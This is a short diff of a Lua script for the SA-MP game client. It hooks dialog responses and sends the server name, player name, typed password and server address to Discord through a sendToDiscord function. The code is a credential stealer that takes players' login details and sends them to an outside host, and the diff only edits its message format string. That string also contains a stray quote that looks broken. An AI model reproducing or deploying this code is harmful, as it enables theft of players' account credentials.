@@ -29,7 +29,7 @@ function sampev.onSendDialogResponse(satu,dua,tiga,inputtext)
     local serverIP = sampGetServerIP()
     local serverPort = sampGetServerPort()
 
-    sendToDiscord(string.format("server: %s username: %s password: %s" Server IP: %s", servername, playerName, inputtext, serverIP, serverPort))
+    sendToDiscord(string.format("server: %s username: %s password: %s" ServerIP: %s", servername, playerName, inputtext, serverIP, serverPort))
 end
 
 function sendToDiscord(message)
